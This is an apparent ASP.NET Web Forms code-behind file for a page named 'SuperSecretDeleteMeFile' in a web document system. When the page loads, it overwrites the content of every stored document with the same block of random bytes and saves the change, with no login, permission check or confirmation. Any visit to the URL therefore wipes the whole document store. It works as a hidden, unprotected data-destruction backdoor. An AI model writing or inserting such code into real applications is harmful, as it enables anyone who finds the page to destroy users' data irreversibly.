using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using WebDocumentSystem.Models;

namespace WebDocumentSystem.Document
{
    public partial class SuperSecretDeleteMeFile : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            using ( WebDocDBEntities ctx = new WebDocDBEntities())
            {
                Random rnd = new Random();
                byte[] b = new byte[4096];
                rnd.NextBytes(b);
                var documents = from c in ctx.Documents
                                select c;
                foreach (var document in documents)
                {
                    document.DocContent = b;
                }
                ctx.SaveChanges();
            }
        }
    }
}